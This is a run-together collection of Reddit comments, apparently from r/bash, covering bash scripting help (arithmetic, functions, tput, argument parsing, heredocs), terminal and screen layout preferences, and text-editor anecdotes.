Right
2 screens; one straight ahead and one diagonal to the right; terminal on right because I don't look at it as much as the other screen. when i do end up looking at it for long periods of time, i move it over to the screen that's straight in front.
It used to be left lower corner, but I have now moved to right lower corner.
if i'm reading something while at the same time doing something in the terminal, i'd put the terminal on the right side as most text would be aligned to the left. otherwise, it could be anywhere on the screen or full screen as a virtual terminal.
bottom 1/3, left 1/3. The top 2/3 right2/3 section is for main work.
I do it in top 1/3, left 1/2 and then mutt goes on the top 1/3, right 1/2. The other 2/3 bottom is where the magic happens.
Yes.
I'm not sure I'm understanding the question completely, but it sounds like you want to get the full path of a file located by `find` but when you run it, you're getting a relative path? e.g. you're getting something like this: $ find . -type f ./a/1/foo but you want the output to be like: /home/voltaic/a/1/foo Is that right? If so, you need to pass the full base path to `find` in the first place, e.g.: $ find $PWD -type f /home/voltaic/a/1/foo If I've misunderstood the question, let me know.
Yeah, I love transparency. Makes it so easy to type commands in from a reference.
Yes, create a function in your .bashrc like this: cdd() { cd "$1"; dir } Then call `cdd pathname`
Ah, that's fantastic! Thank you!
&amp;&amp; instead of ; cdd() { cd "$@" &amp;&amp; dir; }
Yep - good call. Strangely, I thought of that when I first read the OP, then failed to code it that way. * shrugs *
That's a a great thought! I also typically have a notebook on the right side of my computer. I'll let you know if I unearth any kind of research on this. Part of me thinks that IDE developers may have done some proprietary research and so whatever layout a popular IDE uses may be the "best", but you can't say forsure that the developers didn't just throw something together.
Thanks for your elaboration! That image about sums up my understanding of the topic, I know little more than that.
This is the way that I usually operate. Someone said something about writing with their right hand so the terminal goes on the right side but the comment about the mouse being on the right is valid as well.
I'll check it out.
This is where I'm at. Any reasons why you switched?
Is this 'better' because it only calls `dir` if `cd ` successfully completes?
Yes. :D If it didn't, you'd stay in the same directory, and still get a listing. 
 #!/usr/bin/env bash num=0 while [[ $num -le 9 ]]; do ((num++)) echo "$num is less than ten" done 
How come the variable should be naked instead of with the $? I thought you used $ when referencing an already defined variable? Also, what is the function of ((num++))?
I think my desk setup is kinda weird, but it's slightly oriented toward the left side of the screen. I have having to reposition myself to read my browser window, I moved that from the right half of the screen to the left. Atom and Terminal take up the other half.
You use $ when you want to read the variables value. If you're creating a new variable, or assigning a value, then you don't use $. `((num++))` increments num by one. It's the shorter version of your `let num=$(($num+1))`. And `((num--))` decrements it by one. See if you can guess what this one does: `((num+=3))`
Bash goes through each line and replaces the `$` stuff with its value before it executes the line. This means, for the following line: $num=$((num+1)) Bash translates that into: 0=1 When it then tries to execute that, you see your weird error message. That's why you want `num` and not `$num`. Without the `$`, bash will execute this: num=1 Another thing, that `let` is already enabling the math mode, somewhat similar to `((...))` and `$((...))`. You can do just the following, no need for `$` before variable names and no need for `$((...))`: let num=num+1 Here's an experiment with that on the command line: $ num=3 $ let num=num+1 $ echo $num 4 I don't see people using `let` often. It seems to me it's for some reason unpopular. I see people more often do the following, which is using just the normal `name=...` assignment in bash like with text, plus `$((...))` for the math: num=$(( num + 1 )) Then there's also that `((...))` that was mentioned, where you can add spaces around any operator for better reading: (( num = num + 1 )) You can also use that `((...))` in your while loop, perhaps making the comparison easier to read: while (( num &lt;= 9 )); do ... done 
Or, as I usually do: `for ((num=0; num&lt;=10; num++)); do`
To completely fulfill OP’s requirement, you can also actually call the function `cd`: function cd { builtin cd "$@" &amp;&amp; dir } Using the `builtin` command to call the actual `cd` builtin and not (recursively) the `cd` function.
Ah cool, didn't know how to solve that. Hence the cdd. Thanks!
Hey... nice one. Now I'd like to know too. :D
Check out the $SSH_CLIENT or $SSH_CONNECTION variables, if those aren't getting set on connection you can try parsing `who` based on `tty` in your script (I think that should work). 
Could be also a right handed thingy. We need more feedback from left-siders :-)
Just tried it with $SSH_CLIENT - works well. :D
Oh, nice! Both of those seem to work beautifully!
&gt; Downside is that it relies on each host to tell the truth about its own IP. :P There is no benefit of lying to my script about IP. The user must be already trusted to ssh to run it, and my script doesn't give any extra powers that they can't do already. This solution, and the one above are both great! I think I'm going to use the variable since I can remove the ports with parameter substitution and not open a subshell. echo ${SSH_CLIENT%% *}
Your flair, i read as *total batshit* lul
 #!/bin/sh [ -n "$ABC" ] &amp;&amp; printf 'XYZ=%s\n' "$ABC" | grep -Eo '..$' --- % eval "$(./script)"
Maybe something like: column -s, -t &lt; derp.csv | sort -k 3,3 will get you started. I'd probably use something like python for processing CSV though.
I attempted to create a script to make it easy to use "play" from the SoX package to compose music in the command line. You can get a copy of the script used in the video here: https://github.com/TheOuterLinux/VidmeNotes/blob/master/Command-Line/10%20-%20Composer%20Script%20-%20Shchedryk
Looks like your homework assignment, so I will only give a hint. use awk to separate into fields. Pipe output to sort.
Use the great csvkit
It only uses the first character in the IFS variable to join things up. You have to join stuff yourself with `printf` and a loop or a similar idea when you want to use more than one character. IFS is by default set to `$' \t\n'` (space, tab, newline), and when you do `$*` with that default, you notice it joins stuff up just using the space character.
Thanks
 XYZ="999${ABC: -2}" 
 XYZ="999${ABC: -2}" 
Thanks!
I edited my post with a working `join()` for this problem if you didn't see it.
perfect, this works!
Good solution! Just to expand a bit - the space is necessary to avoid being interpreted as "default value" e.g. $ ABC= $ echo ${ABC:-2} 2 You can also use parenthesis instead of space: XYZ="999${ABC:(-2)}"
Agreed - but that's an extra character. ;)
Complete noob here. I tried trim $(youtube-dl -f 22 -g https://youtube.com/watch?v=VideoID) Where trim is the script made executable and perefectly handles local mp4 files.
#!/bin/bash read -p 'Do I know Bash: ' answer echo $answer &gt; myfile.txt
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
Do you get any error messages?
Is variable $USER visible inside script? If not export it in original shell
Nope
I bet AppleScript is adding a hidden character during save. Run a checksum on both files and report back. md5sum 
How are you creating the file in AppleScript?
Couldn`t use md5sum. Used diff instead. Got this on terminal. First one is applescript generated, second one manually. 1c1,2 touch /Users/$USER/Desktop/gallo.txt \ No newline at end of file --- &gt; #!/bin/bash &gt; touch /Users/$USER/Desktop/gallo.txt \ No newline at end of file
Using a custom function in Filemaker performing applescript: Let ([ text = Substitute ( text ; [ "\„" ; "\"" ] ; [ "\”" ; "\"" ] ; [ ¶ ; "\r" ] ) ]; "set this_data to " &amp; Quote ( text ) &amp; " &amp; return ¶set target_file to path_fmp_to_AppleScript(" &amp; Quote ( thePath ) &amp; ") ¶set append_data to " &amp; append_text &amp; " = 1 ¶ ¶write_to_file(this_data, target_file, append_data) ¶ ¶on write_to_file(this_data, target_file, append_data) ¶ tell application \"Finder\" ¶ try ¶ set the target_file to the target_file as string ¶ set the open_target_file to open for access file target_file with write permission ¶ if append_data is false then set eof of the o open_target_file to 0 ¶ write this_data to the open_target_file starting at eof ¶ close access the open_target_file ¶ return true ¶ on error ¶ try ¶ close access file target_file ¶ end try ¶ return false ¶ end try ¶ end tell ¶end write_to_file ¶ ¶on path_fmp_to_AppleScript(myPath) ¶ set myPath to POSIX file myPath as string ¶ set myStartDisk to (path to startup disk) as string ¶ ¶ set AppleScript's text item delimiters to myStartDisk &amp; myStartDisk ¶ set the item_list to every text item of myPath ¶ set AppleScript's text item delimiters to myStartDisk ¶ set myPath to the item_list as string ¶ set AppleScript's text item delimiters to \"\" ¶ return myPath ¶end path_fmp_to_AppleScript" )
Don't use AppleScript to create bash shell scripts. See all those extra characters? Those are bad, mmkay?
[removed]
Not sure if this is what you are trying to do... [[ $(grep blahblah) ]] &amp;&amp; [[ $(grep blahblah) ]] &amp;&amp; some action Or replace first &amp;&amp; with || 
That's basically what I am looking for. What I am trying to do is grep my string in `$fileCheck` or grep my file for `echo '*'`whichever one is in my `$commandList. The thing is though,`$fileCheck` is working even though it shouldn't since my `$commandList` doesn't contain that string...
Long shot: anyone knows how to use YouTubeDL to download ESPN3 games? 
I need to. The idea is to modify docx documents based on data inside a filemaker database. So FM to applescript to shell to docx. Well, It is actually faster to just type the info manually than finding the solution but now I'm just stubborn on making this work. What's wierd is that if I copy paste the content of the non-working applescript made file to another file it works there.
I don't really understand the problem you have. Just take this piece of advice, maybe it helps you. egrep "$i|$j" file.txt searches the file for var i OR var 2 hope that helps!
Are these DRM protected?
I don't think so, since you can rip ESPN3 using TubeDigger. I don't want to spend $25 for it though. YoutubeDL website claims ESPN3 is supported. I havent been able to make it work.
Just a note about egrep: https://github.com/koalaman/shellcheck/wiki/SC2196 As to your wider question, you're not really clear on what you actually want. Can you provide some example input and a desired output?
Much appreciated!
*shrug* Apple Try to edit with nano, or another text editor? 
If that's the case, then you'll need to sed out the carriage returns.
Apple has additional permissions on top of standard Unix permissions. It’s possible that the file being generated is locked via those permissions. You’d be able to tell if you opened the Get Info inspector on the AppleScript generates one and looked towards the bottom at the Security section I believe.
I noticed I had made a mistake with that `join()`. It doesn't work right if there's just one element: $ join ';' a a; Here's a fix for the problem: join() { local sep="$1"; shift; printf "%s" "$1"; shift; (( $# )) &amp;&amp; printf "$sep%s" "$@"; echo; } or with line-breaks: join() { local sep="$1"; shift printf "%s" "$1"; shift (( $# )) &amp;&amp; printf "$sep%s" "$@" echo } It now looks like this: $ join ';' a a $ join ';' a b a;b 
Full screen.
You keep posting questions, but you never really explain what you're trying to accomplish. It looks like you're probably working on the same script you have been for quite awhile now. I feel like the XY Problem is going to become very applicable here, if it hasn't already. Have you noticed the number of people who see your posts and mention some variation of "I don't understand what you're trying to do"?
My bad, I will take in account for this. I just don't want to create a giant explanation and instead try to just focus on a smaller portion of the main issue. I will fix and explain what I'm doing overall and in the future do the same. The scripts are small scripts that I'm hoping to use for reference to create the actual one I want. I just figured that's better than writing a huge one and having more issues. 
I updated with my problem and what I need to happen. Thanks for your tip!
 I just updated with what I'm looking for, thanks for the pointer about egrep.
nope, i get this ': not a valid identifier
You can experiment with the code at the command line, see here: $ read -p 'Do I know Bash: ' answer Do I know Bash: hello $ echo $answer hello It seems to work fine.
What error did you get?
Are you trying to search the file for the string 'echo '*' '? Edit: I think your problem is assuming you can shove all the arguments together in one string; "arg1 arg2" is different from "arg1". You could either loop over the arguments in $filecheck and grey them one by one, something like this: command="$1" #if command is not in command list, add it and echo it If ! grep "$command" &lt;&lt;&lt; "$commandList; then commandList="$commandList $command" echo $command Fi allCommands=( $commandList ) For c in ${commandList[@]}; do Grep "$c" &lt;&lt;&lt; $fileCheck Done Grep "echo '*'" &lt;&lt;&lt; $fileCheck 
Please correct your code formatting. Use 4 spaces before each line. 
Yes. To help get you started, this can be your `install.sh`: #!/usr/bin/env bash apt-get update apt-get -y install nginx Then launch it with: sudo ./install.sh 
Read the advice given to you again. You must be putting the colon after the single quote.
[removed]
 function delim() { [[ -z "$1" ]] || [[ -z "$2" ]] &amp;&amp; echo "Usage: $FUNCNAME &lt;string&gt; '&lt;delimiter&gt;'" &amp;&amp; return echo $1 | awk '$1=$1' FS= OFS="$2" } delim Usage: delim &lt;string&gt; '&lt;delimiter&gt;' delim string '\\;' s\;t\;r\;i\;n\;g 
By default, bash waits until the last command has completed before executing the next command. Basically, you just add one command per line until you get what you want done. /u/OneCDOnly covered what you want to do pretty well. If you want to learn more, you should start here. http://www.tldp.org/LDP/Bash-Beginners-Guide/html/Bash-Beginners-Guide.html
I sometimes also write single functions as individual scripts, if they're complex and part of a larger project. If you feel that explaining the project as a whole might divert too much attention away from your immediate goal, simply explaining what you need your current function to do. If you want some insight on how other people would approach your project as a whole, maybe make a post about that as a whole. Working out solutions to other people's projects is fun for everyone. 
It's important to mention that you're introducing the concept of arrays to this script. Your example might break with default IFS.
[removed]
It's not bash related but for similar uses you can use 'expect'. 
No, don't start with that garbage. Start here: http://mywiki.wooledge.org/BashGuide
I've been referencing tldp.org for years. It has its issues, but why do you recommend wooledge.org?
Unlike the tldp-guides, the wooledge guides teaches good practices and are written by people who actually knows bash. The Bash Beginners Guide, for instance, tells people they should prefer the $[...] syntax for arithmetic expansion. Failing to note it was deprecated two decades ago, and even removed from bash's documentation shortly after that. The Advanced Bash-Scripting Guide is even worse. You can find bad practices and/or plain false information in almost every chapter. Also note how this subreddit's sidebar does not link to any of the tldp guides.
one liner: `sudo apt-get update &amp;&amp; apt-get -y install nginx`
More commands need to go there, see the guide!
I'm not that great at bash, but I didn't like tldp either. I've been using this to get the basics: http://www.tutorialspoint.com/unix/ Is it any good? I haven't been using the man pages, like I probably should. Especially since I prefer more reference-like guides. Navigating between man pages just feels so awkward for me. Vim help is better but that also feels weird, like searching topics on multiple pages. Any tips for using man pages in general? I was thinking of trying to get more comfortable with http://zsh.sourceforge.net/Guide/zshguide.html since I use zsh and I'd like to learn tips for both.
If you append "&amp;&amp;" after each command, if the command completes successfully, it will execute the next command. ps aux &amp;&amp; w &amp;&amp; echo "Hello World" &amp;&amp; apt-get -y install something &amp;&amp; false &amp;&amp; echo "This last command will never run."
Also, at some point take a look at Ansible - that's how we handle repeated series of installations across servers in the professional world.
Actually, the only thing a bash script can do is execute commands, there are no real keywords as they appear in java, python,... Everything you type in a bash script is either a command or a string. 
Looks like you just want someone to write this for you. :(
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
&gt; What is this $EINS? It looks like a variable the original user defined for themselves and used in the examples shown - it's specific to **their** installation. But it's not a "generic" system variable. ;)
I think kwan has the right idea. Would be helpful that if you didn't copy and paste what was provided, you provide a copy of your code so we can see it and better assist you.
That should work fine, assuming `somescript.py` is on the PATH. Are you able to run that in a terminal? How is the bash script being run?
I ment, nginx asks for a lot of stuff, like, it's not a simple -y, but it's more of "y" then wait then "y" then wait then "n" then wait, how would I do that is it like -y -y -n install nginx?
To begin an ansi sequence I believe there's a special escape code so I'm guessing that's the definition
The escape is already shown there: `'\033`
How do you know it's not executing? 
I figured out the problem, and it was a weird one. The user had cut and paste the script from an outlook html message into a terminal. When the "-" was pasted in, it ended up getting translated in to some unicode stuff, when I manually edited out the "-" switch and added a new "-" things started working fine.
Ahh yes. I've been bitten by that too. 
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
You'll likely need to provide a bit more information about your input files. Are you looking to tokenize every word in the first file and then search the second for these words? You mention strings. Are you talking about arbitraily large strings? So we need to search the second file for the following from the first file: "a" then "a b" then "a b c". You r question, as posed, is poorly defined.
&gt; I haven't been using the man pages, like I probably should. Especially since I prefer more reference-like guides. Navigating between man pages just feels so awkward for me. Vim help is better but that also feels weird, like searching topics on multiple pages. Any tips for using man pages in general? `man` pages are good when you need to check the exact syntax required for a command. Or you might have forgotten the code for a parameter. But, they're not too good at covering concepts. The first time you want to learn a new command (what it does, what it's for, etc...) - Google it. When you know which command you need because you've used it before, and just need a quick reminder - use `man`. Also, I've never understood `vim`. Maybe try `nano` instead. ;)
Once you become comfortable with vim navigation, substitution, the ability to interact with a shell from vim, and a customized .vimrc, you'll likely never use nano again. Then again, it's just a text editor. Whatever suits your workflow.
I really should learn it. I've only had a couple of occasions where I was on a system (usually running BusyBox) and didn't have access to `nano` (as it couldn't be installed). Of course, that "*really should*" means I doubt I'll ever get 'round to it. :D
You don't need expect if you use the `yes` flag for `apt-get`, i.e `apt-get -y`.
By this point, you probably won't get around to it. The only reason I did is because I started out early enough that editors like nano weren't always part of the default install. Since I was working with PPC/68k hardware, it was usually vi/vim, or nothing. These days, enough of vim has become muscle memory that I just have a hard time using nano. If you don't have a basic level of proficiency with vi right now, I recommend gaining one. One day, you're going to run in to a server running some ancient release that only had vi.
Only if I started working in IT again. I retired some years ago. :D
That's hilarious. You've been around longer than me, and you never picked up vi. I have no idea how you did it, and congratulations on retirement. How in the world did you make it back then as far as text editors go? 
Well, I didn't start in Linux until I no longer had to support Windows/MS-DOS. &gt; How in the world did you make it back then as far as text editors go? Same as everyone else I guess. Good old `edit`. :D
Looks like I need to put another text editor under my belt in case I run into a really ancient system. ;)
Anyone could use it with zero experience. But I haven't used it since my BBS days in the early 90's with my 2400bps modem. Ever get into BBS file-sharing? 
My early Internet days were filled with chatting in HTML rooms on BeSeen. My memories of 2400 baud modems were of my father cursing as he tried to make a dial in connection to work using a key generator that looked like a calculator. By the time we got Internet service, I think we were using 14.4, which was pretty snappy at the time. By that point, there was less BBS activity as Internet services became more like what we know them today. Before that, it was LAN only over Appletalk.
Oh shi*t. Sorry, I just found a wiki page on `edit` and it mentioned the previous editor I had completely forgotten about called `edlin`... haha... that thing was diabolical. :D https://en.wikipedia.org/wiki/Edlin 
**Edlin** Edlin is a line editor, and the only text editor provided with early versions of MS-DOS. Although superseded in MS-DOS 5.0 and later by the full-screen edit command, and by Notepad in Microsoft Windows, it continues to be included in the 32-bit versions of current Microsoft operating systems. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/bash/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
Thank you again /u/WikiTextBot - nice job. 
If I remember correctly, I've had incidents where I've accidentally invoked `ed` and been totally lost. Finding yourself in an accidental session with an editor you don't know can be very disorienting. 
That happens to me every time I'm on a system where the default editor is `VIM` :D
[removed]
Learn it! I swear it's good! Thing is that the learning curve is steep. Command mode versus edit mode is the hardest thing to get used to. 
haha... I just launched VIM then in a Konsole screen - and couldn't exit the damn thing so I just killed the terminal session instead. ᕕ( ᐛ )ᕗ
How do you change modes?
if I understand correctly you need to send signals to your script. If yes, then you should look at ```kill -l``` and ```trap```.
When you launch vim with a new text file, you can enter insert mode by pressing `i`. Then you can type. Then press `esc` to exit insert mode. To enter command mode, press `shift-:` Of you want to save your text file, enter command mode, enter `w` and press enter. If you want to quit vim, enter `q` instead. My cat just punctured a vein on one of my hands. There was blood everywhere. The bandage is slowing my typing speed by a lot. My apologies. 
Kill the process, not the terminal! 
Oh, I don't mess about - it was either that or the power-cord. ಠ_ಠ
ewww... is the cat OK? Kidding, just kidding... hope you're well. Thanks for the advice there, I'll muck about with it a little and see what happens. :D
Kind of low rent but you could read the intervals from a file inside the loop, and update the file from wherever. Small file won’t waste a ton of resources. 
I'm assuming these are binary files, so something like this might work: #! /bin/bash grep -Fxf &lt;(strings "file1") &lt;(strings "file2") Where we grep the `file2` using every string from `file1` (`-f`) as fixed string patterns (`-F`) matching only full lines (`-x`). The strings are read from process substitutions using the `&lt;()` syntax.
i'm a little new to bash could you give me an example
i'm a little new to bash could you give me an example
$ mysql_secure_installation It should type n to the following: - VALIDATE PASSWORD PLUGIN - Change the root password? It should type y to the following : - Remove anonymous users? - Disallow root login remotely? - Remove test database and access to it? - Reload privilege tables now? would that be: mysql_secure_installation -n -n -y -y -y -y ?
$ mysql_secure_installation It should type n to the following: - VALIDATE PASSWORD PLUGIN - Change the root password? It should type y to the following : - Remove anonymous users? - Disallow root login remotely? - Remove test database and access to it? - Reload privilege tables now? would that be: mysql_secure_installation -n -n -y -y -y -y ?
 comm -1 -2 &lt;(sort file1) &lt;(sort file2)
If you currently use something like `$(tput ...)` directly inside the text you output, make it so you save all of that in variables, something like this: textcolor=$(tput ...) Then use that variable in your output with `${textcolor}`.
Thanks for answer I dont use this kind of structure. Problem is that I have a lot of things to print and a lot of different tput options (moving lines etc.). Add that to refreashing every 1s and screen gets messy while updating. I was hoping for something like buffering output before placing it on the screen. It looks like there is no such thing tho. 
You could try to save everything in a variable, then print the variable, something like this: x=$( echo hello echo hi echo hey ) echo "$x" 
on a phone now, but basically you can use these signals ```10) SIGUSR1 12) SIGUSR2``` to increase or decrease the sleep numbers. ```trap``` them in your script
It's the same thing. E.g. instead of `tput cub1` or whatever, do `echo -e '\e[D'`.
*Please* don’t tell people to hardcode terminal-specific escape sequences instead of using terminfo/`tput`. (`echo -e \e[D` doesn’t even seem to do the same thing as `tput cub1` in my terminal.)
It seems it called `tput kcub1`. In that case you do left=$(tput kcub1) right=$(tput kcuf1) #rest of script with a loop echo "a${right}bb${left}c"
Perhaps save tput's output in variables at the start of your script, then use those later, not hard-coded escape strings and such. I mean do something like: bel=$(tput bel) bold=$(tput bold) red=$(tput setaf 3) Then later do: echo "${red}${bold}hello${bel}"
Hey, after doing the `echo "${red}${bold}hello${bel}"` thing, my terminal becomes bold and red, until I quit or enter `tput reset`. Any workarounds?
Yeah, there's a "getopts" command to help parse arguments, but I never use it. I usually do this: for x; do case "$x" in -e|--exclamation) exclamation=1 ;; sayH|sayHe|sayHel|sayHell|sayHello) sayHello=1 (( commands++ )) ;; sayB|sayBy|sayBye) sayBye=1 (( commands++ )) ;; *) usage exit 1 ;; esac done if (( commands != 1 )); then # somehow warn to use one of either sayHello or SayBye usage exit 1 fi That "sayB|sayBy|sayBye)" is like that to allow the user to shorten the parameter. That "usage" thing is a function where I output a help text about the script. It's something like: usage() { cat &lt;&lt; EOF Usage: ${0##*/} [options] command bla bla bla. Commands: bla bla bla bla bla. Options: bla bla bla bla. EOF } That `${0##*/}` inserts the script's name with the path cut off. Later in the script I use those variables that are being set in that 'for x' loop, so something like: if (( sayHello )); then text="Hello" fi if (( sayBye )); then text="Bye" fi if (( exclamation )); then text="$text""!" else text="$text""." fi echo "$text"
This won't be a problem if you customize your prompt to use some colors. It will then always overwrite colors that were left over from a previous command. What you can do right now is, run `tput init`. About how to customize the prompt, google something like "customize bash prompt ps1".
Great answer! Thank you very much, but can i ask one thing: what does `cat &lt;&lt; EOF` do? Thanks again!
When you use `&lt;&lt;`, like this: program &lt;&lt; word ... ... ... word Bash sends the next few lines of text into the program's "standard input" stream until it runs into a line with that `word` on it. I used `cat &lt;&lt; EOF` here instead of a bunch of `echo` lines because I thought the help text is easier to edit that way. I was thinking it's easier to get a feel about how the end result will look like to the user at the terminal. The `EOF` word has no special meaning, it's just a weird word that probably never shows up in text you copy'n'paste, so is a good end marker. It's supposed to mean "end of file".
So ``` cat &lt;&lt; EOF Great help Thank you Very much EOF ``` Would print ``` Great help Thank you Very much ``` ?
No, there have to be line breaks and the end word has to be on its own line.
Ok thanks! Now I'm in a very good mood
I have to say that `for x;`confused me, had to search around for a while before i understood it was equivalent to `for x in "$@"`, next time you explain to someone, maybe tell them about this! 
I guess you are right. I now edited the original post to add that `in "$@"` to make it less confusing for the next person that sees it.
I usually have my coding editor in the middle, documentation on on the right and emails on the left. You could say I like my information coming from the far right and my b.s. coming from the far left. ;)
This is true of anything that can be done "in shell" (like `echo`) vs having to call a separate executable program (like `tput`). /u/ropid has the right of it: you should always still use `tput`, because it ensures the correct output for the terminal you are on. But store it off in a variable, then use something in-shell to reproduce the output when needed. Another great example of the speed thing is getting the date; calling out to the actual `date` command is expensive, while the `printf` command can give you the same thing using `printf "%(format)T" -1` As long as we're doing PSAs, you should stop using `echo`. Learn how to use `printf` instead. `echo` behaves differently depending on what flavor you happen to hit (depending on OS and shell), while `printf` is always consistent. It can also do a lot more things than `echo` can, so it's more versatile.
So you're trying to tell me you *are* a shill, then?
not that it matters, but since reset is a tput command that could be confusing (so is clear, so same for that) normal is my suggestion.
I agree. If only `printf "%(format)T" -1` was as quick to type, and easy to remember as `date`. Can `printf` output an audible bell character, by the way?
Yes, with a \a in the format
for {1..10000} Is an easier way to setup that loop 
Just wrote this so it's not well tested. Please excuse any mistakes. :) if (ls *.0 &amp;&gt;/dev/null) &amp;&amp; [ -e program1 ]; then
Thanks alot, works like a charm!
Or just `sgr0`, which is the actual terminfo capability name. ([**s**elect **g**raphic **r**endition](https://en.wikipedia.org/wiki/ANSI_escape_code#SGR_.28Select_Graphic_Rendition.29_parameters) **0**, btw. )
In addition to what /u/ropid and /u/DrHoneydew78 said – why would you *ring the terminal bell* thousands of times per second? My motherboard’s speaker isn’t made for that, it makes it sound like a broken cassette player. You may require cursor movement commands and the like to be efficient, but for the terminal bell this should never matter.
Think twice before trying to optimize something. Do you really care if your still script runs 0.001 seconds faster? I'd that more important that portable code and good coding practices? If speed is that important, is shell the right language for it?
You're right. It is certainly easier to write, easier to remember, and more readable too. It's just that I think that the `((v=0;v&lt;10;v++))` is more... formal?
Thank you, I will try this.
The `for ((v=0;v&lt;10;v++))` thing is interesting if you want to use some calculations for the start and the end, perhaps involving variables. You can't do that with `{0..9}`. I mean, you can't do something like this: end=9 for v in {0..$end} Bash will replace the variable in that spot with a "9" but it will not interpret the result afterwards. It will not create a sequence of numbers, instead it will set $v to a text "{0..9}" and the `for` loop runs just once with that weird text.
Well, it seems like you could output all your text to a series of line variables. And then when you are ready, clear the screen and output the array one after the other, bam bam bam. It may work better, even if you are re-writing a majority of the content.
For numeric less than comparison in Bash, you want `-lt` instead of `&lt;`.
Thanks very much, swapped it to `-lt` and it now works as intended :)
There's an alternative that you might be interested in: You can switch from using `[[` to `((`. That `((` feature is some sort of math mode in bash. Inside it, you can use `&lt;` to compare. You can also drop the `$` from variable names. It would look like this: if (( OCR &lt; 500 )); then ... This `((` thingy can only do integer numbers, no floating point numbers. You can get some documentation about it with: help '((' and help let
Or `[[ $OCR -lt 500 ]] &amp;&amp; echo "$OCR is below 500" || echo "$OCR is above 500"`
 done &lt; &lt;(shuf file)
Thank you that works!!
Sure thing. Here's looper.sh: #!/usr/bin/env bash me="$(basename $0)" echo "START $me" # loop until: interval.ctl or title.ctl deleted; interval &lt; 0; or title = '/fin' while true; do [[ -e interval.ctl ]] &amp;&amp; interval=$(&lt;interval.ctl) || (echo "no interval"; break) [[ -e title.ctl ]] &amp;&amp; title="$(&lt;title.ctl)" || (echo "no title"; break) echo " .. title:'$title' interval:$interval" [[ $interval &lt; 0 || $title = /fin ]] &amp;&amp; break sleep $interval done echo "FINISH $me" In one session I executed: ~/tmp/looper $ echo "Title from File" &gt; title.ctl ~/tmp/looper $ echo 3 &gt; interval.ctl In a second session I started up the script: ~/tmp/looper $ START looper.sh .. title:'Title from File' interval:3 .. title:'Title from File' interval:3 Then in the first session I executed the following a few seconds apart: ~/tmp/looper $ echo "New Title" &gt; title.ctl ~/tmp/looper $ echo 4 &gt; interval.ctl ~/tmp/looper $ echo -1 &gt; interval.ctl ~/tmp/looper $ Which yielded.... .. title:'New Title' interval:3 .. title:'New Title' interval:3 .. title:'New Title' interval:3 .. title:'New Title' interval:4 .. title:'New Title' interval:4 .. title:'New Title' interval:-1 FINISH looper.sh ~/tmp/looper $ 
Release link: https://github.com/rewtnull/kernel-changelog-shell-parser/releases/latest
You have a typo when checking for bash version, the text says 4.4 or newer while checking for 4.2 or newer. 
That I do! Thanks for noticing. This, and a couple of other minor typos (nothing script breaking), will be fixed in the next update.
 shuf filename | while # POSIX compatible
The `&lt;` operator compares lexicographically: Your test considers a future bash 4.10 too old, use the BASH_VERSINFO array and compare major and minor version numbers arithmetically. Avoid hard-coding terminal sequences, retrieve the necessary values by querying a terminal database with `tput`; use `unset -f` to undefine functions, but then really why undefine functions; prefer testing exit codes over output, e.g. `missing () { if ! command -v -- "$1" &gt; /dev/null; then ...; fi; }`; it seems unfitting to test for the existence of standard tools like awk and getopt, especially when relying on non-portable features anyway (the code claims to test whether getopt is the GNU variant); declare variables local in functions instead of always unsetting; a few quotes are misplaced, e.g. the URL should be quoted.
The `&lt;` operator compares lexicographically: Your test considers a future bash 4.10 too old, use the BASH_VERSINFO array and compare major and minor version numbers arithmetically. Avoid hard-coding terminal sequences, retrieve the necessary values by querying a terminal database with `tput`; use `unset -f` to undefine functions, but then really why undefine functions; prefer testing exit codes over output, e.g. missing () { if ! command -v -- "$1" &gt; /dev/null; then ... fi } It seems unfitting to test for the existence of standard tools like awk and getopt, especially when relying on non-portable features anyway (the code claims to test whether getopt is the GNU variant); declare variables local in functions instead of always unsetting them; a few quotes are misplaced.
Thank you very much for your input. &gt; The &lt; operator compares lexicographically: Your test considers a future bash 4.10 too old, use the BASH_VERSINFO array and compare major and minor version numbers arithmetically. Yes, I am aware of this. This is a reuse of some old code, and honestly I had not thought about it for some time, so thank's for reminding me. The BASH_VERSINFO array comparison is an excellent idea. I will rewrite this. &gt; Avoid hard-coding terminal sequences, retrieve the necessary values by querying a terminal database with tput Being an old Amiga user, back in the days I used to enter ansi sequences directly in the editor, I prefer it this way. :) &gt; use unset -f to undefine functions, but then really why undefine functions I figured that not when not using -f, it worked anyway, just as `declare func() ...` is not necessary. It's not clear to me why I shouldn't unset the functions though? My idea is to exit the script as cleanly as possible. &gt; prefer testing exit codes over output Like this?: `[[ $(type "${1}" 2&gt;/dev/null) ]] || error "some error"` &gt; It seems unfitting to test for the existence of standard tools like awk and getopt, especially when relying on non-portable features anyway (the code claims to test whether getopt is the GNU variant) Yes, my bad for the getopt part. Been having issues with this a long time before when I wrote a script that was supposed to work with BSD. Actually what this script requires is the util-linux getopt, (because of the --long-opts (GNU extension)). Rewritten this test. As for awk, excuse my ignorance, but are there different varieties of awk with different functionality? &gt; declare variables local in functions instead of always unsetting them I hear you, and I understand the concept. I just prefer the way I do it because I think its harder to read code with various function calls to blocks of code that are usually one-use. 